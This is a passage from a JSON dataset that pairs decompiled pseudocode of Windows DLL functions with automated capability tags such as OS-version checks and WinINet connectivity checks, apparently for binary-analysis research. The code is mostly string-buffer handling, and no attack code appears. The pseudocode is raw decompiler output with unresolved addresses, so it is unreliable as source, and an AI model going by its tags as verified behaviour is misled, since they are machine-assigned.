2 + 0x180124d20) != 0);\n        fcn.180010d70(&uStack216, 0x180124d20, iVar5);\n        arg1 = fcn.1800687b0(auStack136);\n        arg3 = &uStack216;\n        if (7 < uStack192) {\n            arg3 = CONCAT62(Stack214, uStack216);\n        }\n        fcn.180068c50(arg1, aiStack176, arg3, arg3 + iStack200);\n        fcn.1800686c0(auStack136);\n        fcn.18000dd60(0x1801255d8, aiStack176);\n        if (uStack152 < 0x10) {\ncode_r0x000180004949:\n            if (7 < uStack192) {\n                iVar2 = CONCAT62(Stack214, uStack216);\n                iVar5 = iVar2;\n                if ((0xfff < uStack192 * 2 + 2) && (iVar5 = *(iVar2 + -8),  0x1f < (iVar2 - iVar5) - 8U))\n                goto code_r0x000180004aa7;\n                fcn.18008fb24(iVar5);\n            }\n            iStack200 = CONCAT44(*0x180101904, *0x180101900);\n            uStack192 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack216 = 0;\n            iVar5 = -1;\n            do {\n                iVar5 = iVar5 + 1;\n            } while (*(iVar5 * 2 + 0x180124f28) != 0);\n            fcn.180010d70(&uStack216, 0x180124f28, iVar5);\n            fcn.18000d960(0x180125598, &uStack216);\n            if (7 < uStack192) {\n                iVar2 = CONCAT62(Stack214, uStack216);\n                iVar5 = iVar2;\n                if (0xfff < uStack192 * 2 + 2) {\n                    iVar3 = uStack192 * 2 + 0x29;\n                    iVar5 = *(iVar2 + -8);\n                    if (0x1f < (iVar2 - iVar5) - 8U) goto code_r0x000180004a9b;\n                }\n                fcn.18008fb24(iVar5);\n            }\n            iStack200 = CONCAT44(*0x180101904, *0x180101900);\n            uStack192 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack216 = 0;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(iVar4 * 2 + 0x180125130) != 0);\n            fcn.180010d70(&uStack216, 0x180125130, iVar4);\n            fcn.18000d960(0x1801255b8, &uStack216);\n            if (uStack192 < 8) {\n                return;\n            }\n            iVar4 = CONCAT62(Stack214, uStack216);\n            iVar5 = iVar4;\n            if (uStack192 * 2 + 2 < 0x1000) {\ncode_r0x000180004a7d:\n                fcn.18008fb24(iVar5);\n                return;\n            }\n            iVar3 = uStack192 * 2 + 0x29;\n            iVar5 = *(iVar4 + -8);\n            if ((iVar4 - iVar5) - 8U < 0x20) goto code_r0x000180004a7d;\n            goto code_r0x000180004a9b;\n        }\n        iVar5 = aiStack176[0];\n        if ((uStack152 + 1 < 0x1000) || (iVar5 = *(aiStack176[0] + -8),  (aiStack176[0] - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x000180004949;\n        }\n    }\n    else {\n        iVar2 = CONCAT62(Stack214, uStack216);\n        iVar5 = iVar2;\n        if (uStack192 * 2 + 2 < 0x1000) {\ncode_r0x000180004891:\n            fcn.18008fb24(iVar5);\n            goto code_r0x000180004896;\n        }\n        iVar3 = uStack192 * 2 + 0x29;\n        iVar5 = *(iVar2 + -8);\n        if ((iVar2 - iVar5) - 8U < 0x20) goto code_r0x000180004891;\ncode_r0x000180004a9b:\n        fcn.1800b3528(iVar5, iVar3);\n    }\n    fcn.1800b3528();\ncode_r0x000180004aa7:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1472
    },
    "180004b9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180004b90(ulong noname_0, uchar *arg2, ulong *arg3, ulong *arg4)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int64_t *arg1;\n    ulong arg2_00;\n    uchar *puVar4;\n    int64_t iVar5;\n    ulong *in_stack_00000028;\n    int64_t **in_stack_00000030;\n    uchar auStack152 [32];\n    uint uStack120;\n    int64_t **ppiStack112;\n    ulong uStack104;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    ulong uStack72;\n    uint64_t uStack64;\n    uint64_t uStack56;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack152;\n    uStack72 = CONCAT44(*0x180101914, *0x180101910);\n    uStack64 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack88 = 0;\n    fcn.180010fa0(&uStack88, 0x7fff);\n    if ((in_stack_00000030[2] == NULL) && (in_stack_00000030 != 0x1801255d8)) {\n        arg2_00 = 0x1801255d8;\n        if (0xf < *0x1801255f0) {\n            arg2_00 = *0x1801255d8;\n        }\n        fcn.180011120(in_stack_00000030, arg2_00, *0x1801255e8);\n    }\n    ppiStack112 = in_stack_00000030;\n    if (0xf < in_stack_00000030[3]) {\n        ppiStack112 = *in_stack_00000030;\n    }\n    puVar4 = &uStack88;\n    if (0xf < uStack64) {\n        puVar4 = CONCAT71(Stack87, uStack88);\n    }\n    if (0xf < in_stack_00000028[3]) {\n        in_stack_00000028 = *in_stack_00000028;\n    }\n    if (0xf < arg4[3]) {\n        arg4 = *arg4;\n    }\n    if (0xf < arg3[3]) {\n        arg3 = *arg3;\n    }\n    uStack120 = 0x7fff;\n    (**0x1800de478)(arg3, arg4, in_stack_00000028, puVar4);\n    puVar4 = &uStack88;\n    if (0xf < uStack64) {\n        puVar4 = CONCAT71(Stack87, uStack88);\n    }\n    *(arg2 + 0x10) = 0;\n    *(arg2 + 0x18) = 0xf;\n    *arg2 = 0;\n    iVar5 = -1;\n    do {\n        iVar5 = iVar5 + 1;\n    } while (puVar4[iVar5] != '\\0');\n    fcn.180011120(arg2, puVar4, iVar5);\n    if (0xf < uStack64) {\n        iVar3 = CONCAT71(Stack87, uStack88);\n        iVar5 = iVar3;\n        if (0xfff < uStack64 + 1) {\n            iVar5 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - iVar5) - 8U) {\n                fcn.1800b3528(iVar5, uStack64 + 0x28);\n                goto code_r0x000180004d75;\n            }\n        }\n        fcn.18008fb24(iVar5);\n    }\n    uStack72 = CONCAT44(*0x180101914, *0x180101910);\n    uStack64 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack88 = 0;\n    if (0xf < in_stack_00000030[3]) {\n        piVar1 = *in_stack_00000030;\n        arg1 = piVar1;\n        if ((0xfff < in_stack_00000030[3] + 1U) && (arg1 = piVar1[-1],  0x1f < piVar1 + (-8 - arg1))) {\ncode_r0x000180004d75:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18008fb24(arg1);\n    }\n    in_stack_00000030[2] = NULL;\n    in_stack_00000030[3] = 0xf;\n    *in_stack_00000030 = 0;\n    fcn.18008fb00(uStack56 ^ auStack152);\n    return;\n}\n",
        "token_count": 1083
    },
    "18000526": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180005260(ulong noname_0, ulong *arg2, ulong *arg3, ulong *arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    int64_t *arg1;\n    ulong arg2_00;\n    int64_t **ppiVar4;\n    int64_t **in_stack_00000028;\n    uchar auStack88 [32];\n    ulong uStack56;\n    uint64_t uStack40;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack88;\n    if ((in_stack_00000028[2] == NULL) && (in_stack_00000028 != 0x1801255d8)) {\n        arg2_00 = 0x1801255d8;\n        if (0xf < *0x1801255f0) {\n            arg2_00 = *0x1801255d8;\n        }\n        fcn.180011120(in_stack_00000028, arg2_00, *0x1801255e8);\n    }\n    ppiVar4 = in_stack_00000028;\n    if (0xf < in_stack_00000028[3]) {\n        ppiVar4 = *in_stack_00000028;\n    }\n    if (0xf < arg4[3]) {\n        arg4 = *arg4;\n    }\n    if (0xf < arg3[3]) {\n        arg3 = *arg3;\n    }\n    if (0xf < arg2[3]) {\n        arg2 = *arg2;\n    }\n    (**0x1800de490)(arg2, arg3, arg4, ppiVar4);\n    piVar1 = in_stack_00000028[3];\n    if (0xf < piVar1) {\n        piVar2 = *in_stack_00000028;\n        arg1 = piVar2;\n        if (0xfff < piVar1 + 1U) {\n            arg1 = piVar2[-1];\n            if (0x1f < (piVar2 - arg1) - 8U) {\n                fcn.1800b3528(piVar2 - arg1, piVar1 + 5);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1);\n    }\n    in_stack_00000028[2] = NULL;\n    in_stack_00000028[3] = 0xf;\n    *in_stack_00000028 = 0;\n    fcn.18008fb00(uStack40 ^ auStack88);\n    return;\n}\n",
        "token_count": 600
    },
    "18000586": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180005860(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uchar *arg1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t *arg2_00;\n    int64_t *in_stack_00000028;\n    uchar auStack184 [32];\n    uchar *puStack152;\n    ulong uStack144;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    ulong uStack120;\n    uint64_t uStack112;\n    ulong uStack104;\n    uchar *puStack96;\n    uchar auStack88 [40];\n    uint64_t uStack48;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack184;\n    puStack96 = auStack88;\n    arg2_00 = 0x180125598;\n    if (in_stack_00000028[2] != 0) {\n        arg2_00 = in_stack_00000028;\n    }\n    uStack144 = fcn.18000da90(auStack88, arg2_00);\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack136 = 0;\n    arg1 = &uStack136;\n    fcn.180011120(arg1, 0x1800f4616, 0);\n    puStack152 = &uStack136;\n    fcn.1800050d0(arg1, arg2, arg3, arg4);\n    if (0xf < uStack112) {\n        iVar3 = CONCAT71(Stack135, uStack136);\n        iVar2 = iVar3;\n        if (0xfff < uStack112 + 1) {\n            iVar2 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - iVar2) - 8U) {\n                fcn.1800b3528(iVar2, uStack112 + 0x28);\n                goto code_r0x0001800059d5;\n            }\n        }\n        fcn.18008fb24(iVar2);\n    }\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack136 = 0;\n    if (7 < in_stack_00000028[3]) {\n        iVar2 = *in_stack_00000028;\n        iVar3 = iVar2;\n        if ((0xfff < in_stack_00000028[3] * 2 + 2U) && (iVar3 = *(iVar2 + -8),  0x1f < (iVar2 - iVar3) - 8U)) {\ncode_r0x0001800059d5:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar3);\n    }\n    in_stack_00000028[2] = 0;\n    in_stack_00000028[3] = 7;\n    *in_stack_00000028 = 0;\n    fcn.18008fb00(uStack48 ^ auStack184);\n    return;\n}\n",
        "token_count": 757
    },
    "1800059e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_21h\n\nvoid fcn.1800059e0(ulong noname_0, ulong arg2, ulong arg3, uint *arg4)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    ulong var_17h;\n    ulong var_1fh;\n    ulong var_27h;\n    int64_t *in_stack_00000028;\n    uchar auStack216 [32];\n    ulong uStack184;\n    ushort uStack168;\n    unkbyte6 Stack166;\n    ulong uStack152;\n    uint64_t uStack144;\n    ulong uStack136;\n    uchar auStack120 [31];\n    ulong var_51h;\n    uchar auStack80 [7];\n    ulong var_41h;\n    uint64_t var_39h;\n    uint64_t var_31h;\n    uchar auStack48 [7];\n    ulong var_21h;\n    ulong var_1h;\n    \n    uStack136 = 0xfffffffffffffffe;\n    _auStack48 = *0x180123080 ^ auStack216;\n    puVar3 = auStack120;\n    uStack184 = fcn.18000da90(puVar3, in_stack_00000028);\n    fcn.180005860(puVar3, auStack80, arg2, arg3);\n    if (stack0xffffffffffffffc0 < 0x10) {\n        uVar2 = (**0x1800de7f0)(*0x18012a390, 0x843, 0, 0);\n        *arg4 = uVar2;\n        uVar2 = (**0x1800de7f0)(*0x18012a390, 0x842, 0, 0);\n        arg4[1] = uVar2;\n        arg4[2] = 1;\n        arg4[3] = 1;\n        if (7 < stack0xffffffffffffffc8) {\n            uVar6 = stack0xffffffffffffffc8 * 2 + 2;\n            puVar3 = _auStack80;\n            if ((0xfff < uVar6) && (puVar3 = *(_auStack80 + -8),  0x1f < _auStack80 + (-8 - puVar3))) {\ncode_r0x000180005e15:\n                fcn.1800b3528(puVar3, uVar6 + 0x27);\n                goto code_r0x000180005e1b;\n            }\n            fcn.18008fb24(puVar3);\n        }\n        if (in_stack_00000028[3] < 8) {\ncode_r0x000180005dec:\n            *in_stack_00000028 = 0;\n            in_stack_00000028[3] = 7;\n            in_stack_00000028[2] = 0;\n            fcn.18008fb00(_auStack48 ^ auStack216);\n            return;\n        }\n        iVar4 = *in_stack_00000028;\n        iVar5 = iVar4;\n        if ((in_stack_00000028[3] * 2 + 2U < 0x1000) || (iVar5 = *(iVar4 + -8),  (iVar4 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x000180005dec;\n        }\n    }\n    else {\n        uStack152 = CONCAT44(*0x180101904, *0x180101900);\n        uStack144 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack168 = 0;\n        uVar6 = 6;\n        if (stack0xffffffffffffffc0 < 6) {\n            uVar6 = stack0xffffffffffffffc0;\n        }\n        puVar3 = auStack80;\n        if (7 < stack0xffffffffffffffc8) {\n            puVar3 = _auStack80;\n        }\n        fcn.180010d70(&uStack168, puVar3, uVar6);\n        uVar2 = fcn.180067a70(&uStack168, 0x10);\n        *arg4 = uVar2;\n        if (7 < uStack144) {\n            iVar5 = CONCAT62(Stack166, uStack168);\n            iVar4 = iVar5;\n            if ((0xfff < uStack144 * 2 + 2) && (iVar4 = *(iVar5 + -8),  0x1f < (iVar5 - iVar4) - 8U))\n            goto code_r0x000180005e21;\n            fcn.18008fb24(iVar4);\n        }\n        uStack152 = CONCAT44(*0x180101904, *0x180101900);\n        uStack144 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack168 = 0;\n        if (stack0xffffffffffffffc0 < 7) {\n            fcn.180011cd0(uStack152);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        uVar6 = 6;\n        if (stack0xffffffffffffffc0 - 7 < 6) {\n            uVar6 = stack0xffffffffffffffc0 - 7;\n        }\n        puVar3 = auStack80;\n        if (7 < stack0xffffffffffffffc8) {\n            puVar3 = _auStack80;\n        }\n        fcn.180010d70(&uStack168, puVar3 + 0xe, uVar6);\n        uVar2 = fcn.180067a70(&uStack168, 0x10);\n        arg4[1] = uVar2;\n        if (7 < uStack144) {\n            iVar5 = CONCAT62(Stack166, uStack168);\n            iVar4 = iVar5;\n            if (0xfff < uStack144 * 2 + 2) {\n                iVar4 = *(iVar5 + -8);\n                if (0x1f < (iVar5 - iVar4) - 8U) {\n                    fcn.1800b3528(iVar4, uStack144 * 2 + 0x29);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar4);\n        }\n        uStack152 = CONCAT44(*0x180101904, *0x180101900);\n        uStack144 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack168 = 0;\n        if (stack0xffffffffffffffc0 < 0xe) {\n            fcn.180011cd0(uStack152);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar4 = 1;\n        if (stack0xffffffffffffffc0 - 0xe == 0) {\n            iVar4 = stack0xffffffffffffffc0 - 0xe;\n        }\n        puVar3 = auStack80;\n        if (7 < stack0xffffffffffffffc8) {\n            puVar3 = _auStack80;\n        }\n        fcn.180010d70(&uStack168, puVar3 + 0x1c, iVar4);\n        uVar2 = fcn.180067a70(&uStack168, 10);\n        arg4[2] = uVar2;\n        if (7 < uStack144) {\n            iVar5 = CONCAT62(Stack166, uStack168);\n            iVar4 = iVar5;\n            if (0xfff < uStack144 * 2 + 2) {\n                iVar4 = *(iVar5 + -8);\n                if (0x1f < (iVar5 - iVar4) - 8U) {\n                    fcn.1800b3528(iVar4, uStack144 * 2 + 0x29);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar4);\n        }\n        uStack152 = CONCAT44(*0x180101904, *0x180101900);\n        uStack144 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack168 = 0;\n        if (stack0xffffffffffffffc0 < 0xf) {\n            fcn.180011cd0(uStack152);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar4 = 1;\n        if (stack0xffffffffffffffc0 - 0xf == 0) {\n            iVar4 = stack0xffffffffffffffc0 - 0xf;\n        }\n        puVar3 = auStack80;\n        if (7 < stack0xffffffffffffffc8) {\n            puVar3 = _auStack80;\n        }\n        fcn.180010d70(&uStack168, puVar3 + 0x1e, iVar4);\n        uVar2 = fcn.180067a70(&uStack168, 10);\n        arg4[3] = uVar2;\n        if (7 < uStack144) {\n            iVar5 = CONCAT62(Stack166, uStack168);\n            iVar4 = iVar5;\n            if (0xfff < uStack144 * 2 + 2) {\n                iVar4 = *(iVar5 + -8);\n                if (0x1f < (iVar5 - iVar4) - 8U) {\n                    fcn.1800b3528(iVar4, uStack144 * 2 + 0x29);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar4);\n        }\n        if (7 < stack0xffffffffffffffc8) {\n            uVar6 = stack0xffffffffffffffc8 * 2 + 2;\n            puVar3 = _auStack80;\n            if ((0xfff < uVar6) && (puVar3 = *(_auStack80 + -8),  0x1f < _auStack80 + (-8 - puVar3)))\n            goto code_r0x000180005e15;\n            fcn.18008fb24(puVar3);\n        }\n        if (in_stack_00000028[3] < 8) goto code_r0x000180005dec;\n        iVar4 = *in_stack_00000028;\n        iVar5 = iVar4;\n        if ((in_stack_00000028[3] * 2 + 2U < 0x1000) || (iVar5 = *(iVar4 + -8),  (iVar4 - iVar5) - 8U < 0x20)) {\n            fcn.18008fb24(iVar5);\n            goto code_r0x000180005dec;\n        }\n    }\ncode_r0x000180005e1b:\n    fcn.1800b3528();\ncode_r0x000180005e21:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 2501
    },
    "18000604": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.180006040(ulong noname_0, ulong *arg2, uint *arg3)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    uint64_t arg3_00;\n    uchar uStack72;\n    unkbyte7 Stack71;\n    ulong var_30h;\n    uint64_t uStack48;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    var_20h = 0xfffffffffffffffe;\n    if (arg2[2] == 0x10) {\n        var_30h = CONCAT44(*0x180101914, *0x180101910);\n        uStack48 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack72 = 0;\n        puVar6 = arg2;\n        if (0xf < arg2[3]) {\n            puVar6 = *arg2;\n        }\n        fcn.180011120(&uStack72, puVar6, 6);\n        uVar2 = fcn.1800679c0(&uStack72, 0x10);\n        *arg3 = uVar2;\n        if (0xf < uStack48) {\n            iVar4 = CONCAT71(Stack71, uStack72);\n            iVar5 = iVar4;\n            if (0xfff < uStack48 + 1) {\n                iVar5 = *(iVar4 + -8);\n                if (0x1f < (iVar4 - iVar5) - 8U) {\n                    fcn.1800b3528(iVar5, uStack48 + 0x28);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar5);\n        }\n        var_30h = CONCAT44(*0x180101914, *0x180101910);\n        uStack48 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack72 = 0;\n        if (arg2[2] < 7) {\n            fcn.180011cd0(var_30h);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        uVar3 = arg2[2] - 7;\n        arg3_00 = 6;\n        if (uVar3 < 6) {\n            arg3_00 = uVar3;\n        }\n        puVar6 = arg2;\n        if (0xf < arg2[3]) {\n            puVar6 = *arg2;\n        }\n        fcn.180011120(&uStack72, puVar6 + 7, arg3_00);\n        uVar2 = fcn.1800679c0(&uStack72, 0x10);\n        arg3[1] = uVar2;\n        if (0xf < uStack48) {\n            iVar4 = CONCAT71(Stack71, uStack72);\n            iVar5 = iVar4;\n            if (0xfff < uStack48 + 1) {\n                iVar5 = *(iVar4 + -8);\n                if (0x1f < (iVar4 - iVar5) - 8U) {\n                    fcn.1800b3528(iVar5, uStack48 + 0x28);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar5);\n        }\n        var_30h = CONCAT44(*0x180101914, *0x180101910);\n        uStack48 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack72 = 0;\n        if (arg2[2] < 0xe) {\n            fcn.180011cd0(var_30h);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar4 = arg2[2] - 0xe;\n        iVar5 = 1;\n        if (iVar4 == 0) {\n            iVar5 = iVar4;\n        }\n        puVar6 = arg2;\n        if (0xf < arg2[3]) {\n            puVar6 = *arg2;\n        }\n        fcn.180011120(&uStack72, puVar6 + 0xe, iVar5);\n        uVar2 = fcn.1800679c0(&uStack72, 10);\n        arg3[2] = uVar2;\n        if (0xf < uStack48) {\n            iVar4 = CONCAT71(Stack71, uStack72);\n            iVar5 = iVar4;\n            if (0xfff < uStack48 + 1) {\n                iVar5 = *(iVar4 + -8);\n                if (0x1f < (iVar4 - iVar5) - 8U) {\n                    fcn.1800b3528(iVar5, uStack48 + 0x28);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar5);\n        }\n        var_30h = CONCAT44(*0x180101914, *0x180101910);\n        uStack48 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack72 = 0;\n        if (arg2[2] < 0xf) {\n            fcn.180011cd0(var_30h);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar4 = arg2[2] - 0xf;\n        iVar5 = 1;\n        if (iVar4 == 0) {\n            iVar5 = iVar4;\n        }\n        if (0xf < arg2[3]) {\n            arg2 = *arg2;\n        }\n        fcn.180011120(&uStack72, arg2 + 0xf, iVar5);\n        uVar2 = fcn.1800679c0(&uStack72, 10);\n        arg3[3] = uVar2;\n        if (0xf < uStack48) {\n            iVar4 = CONCAT71(Stack71, uStack72);\n            iVar5 = iVar4;\n            if (0xfff < uStack48 + 1) {\n                iVar5 = *(iVar4 + -8);\n                if (0x1f < (iVar4 - iVar5) - 8U) {\n                    fcn.1800b3528(iVar5, uStack48 + 0x28);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar5);\n        }\n    }\n    return;\n}\n",
        "token_count": 1530
    },
    "1800062e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800062e0(ulong noname_0, int64_t *arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    ushort *arg1;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar auStack248 [32];\n    uchar *puStack216;\n    ulong uStack208;\n    ushort uStack200;\n    unkbyte6 Stack198;\n    ulong uStack184;\n    uint64_t uStack176;\n    uchar uStack168;\n    unkbyte7 Stack167;\n    ulong uStack152;\n    uint64_t uStack144;\n    uchar uStack136;\n    unkbyte7 Stack135;\n    ulong uStack120;\n    uint64_t uStack112;\n    uchar uStack104;\n    unkbyte7 Stack103;\n    ulong uStack88;\n    uint64_t uStack80;\n    ulong uStack72;\n    uchar *puStack64;\n    uchar auStack56 [32];\n    int64_t *piStack24;\n    uint64_t uStack16;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack248;\n    piStack24 = arg2;\n    if ((arg2[2] == 0) && (arg2 != 0x1801255b8)) {\n        uVar2 = 0x1801255b8;\n        if (7 < *0x1801255d0) {\n            uVar2 = *0x1801255b8;\n        }\n        fcn.180010d70(arg2, uVar2, *0x1801255c8);\n    }\n    puStack64 = auStack56;\n    uStack208 = fcn.18000da90(auStack56, arg2);\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack136 = 0;\n    fcn.180011120(&uStack136, 0x1800f462c, 1);\n    uStack152 = CONCAT44(*0x180101914, *0x180101910);\n    uStack144 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack168 = 0;\n    fcn.180011120(&uStack168, \"FoldStructCount\", 0xf);\n    uStack184 = CONCAT44(*0x180101904, *0x180101900);\n    uStack176 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack200 = 0;\n    arg1 = &uStack200;\n    fcn.180010d70(arg1, 0x1800f46a0, 4);\n    puStack216 = &uStack136;\n    uVar2 = fcn.180004d80(arg1, &uStack104, &uStack200, &uStack168);\n    fcn.1800679c0(uVar2, 10);\n    if (uStack80 < 0x10) {\ncode_r0x000180006441:\n        uStack88 = CONCAT44(*0x180101914, *0x180101910);\n        uStack80 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack104 = 0;\n        if (uStack176 < 8) {\ncode_r0x000180006492:\n            uStack184 = CONCAT44(*0x180101904, *0x180101900);\n            uStack176 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack200 = 0;\n            if (0xf < uStack144) {\n                iVar4 = CONCAT71(Stack167, uStack168);\n                iVar3 = iVar4;\n                if ((0xfff < uStack144 + 1) && (iVar3 = *(iVar4 + -8),  0x1f < (iVar4 - iVar3) - 8U))\n                goto code_r0x0001800065c4;\n                fcn.18008fb24(iVar3);\n            }\n            uStack152 = CONCAT44(*0x180101914, *0x180101910);\n            uStack144 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack168 = 0;\n            if (uStack112 < 0x10) {\ncode_r0x00018000652a:\n                uStack120 = CONCAT44(*0x180101914, *0x180101910);\n                uStack112 = CONCAT44(*0x18010191c, *0x180101918);\n                uStack136 = 0;\n                if (arg2[3] < 8) {\ncode_r0x000180006576:\n                    arg2[2] = 0;\n                    arg2[3] = 7;\n                    *arg2 = 0;\n                    fcn.18008fb00(uStack16 ^ auStack248);\n                    return;\n                }\n                iVar3 = *arg2;\n                iVar4 = iVar3;\n                if ((arg2[3] * 2 + 2U < 0x1000) || (iVar4 = *(iVar3 + -8),  (iVar3 - iVar4) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar4);\n                    goto code_r0x000180006576;\n                }\n            }\n            else {\n                iVar4 = CONCAT71(Stack135, uStack136);\n                iVar3 = iVar4;\n                if (uStack112 + 1 < 0x1000) {\ncode_r0x000180006525:\n                    fcn.18008fb24(iVar3);\n                    goto code_r0x00018000652a;\n                }\n                iVar3 = *(iVar4 + -8);\n                if ((iVar4 - iVar3) - 8U < 0x20) goto code_r0x000180006525;\n                fcn.1800b3528(uStack152, iVar3, uStack112 + 0x28);\n            }\n            fcn.1800b3528();\n            goto code_r0x0001800065b8;\n        }\n        iVar4 = CONCAT62(Stack198, uStack200);\n        iVar3 = iVar4;\n        if ((uStack176 * 2 + 2 < 0x1000) || (iVar3 = *(iVar4 + -8),  (iVar4 - iVar3) - 8U < 0x20)) {\n            fcn.18008fb24(iVar3);\n            goto code_r0x000180006492;\n        }\n    }\n    else {\n        iVar4 = CONCAT71(Stack103, uStack104);\n        iVar3 = iVar4;\n        if ((uStack80 + 1 < 0x1000) || (iVar3 = *(iVar4 + -8),  (iVar4 - iVar3) - 8U < 0x20)) {\n            fcn.18008fb24(iVar3);\n            goto code_r0x000180006441;\n        }\ncode_r0x0001800065b8:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x0001800065c4:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1645
    },
    "1800065d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
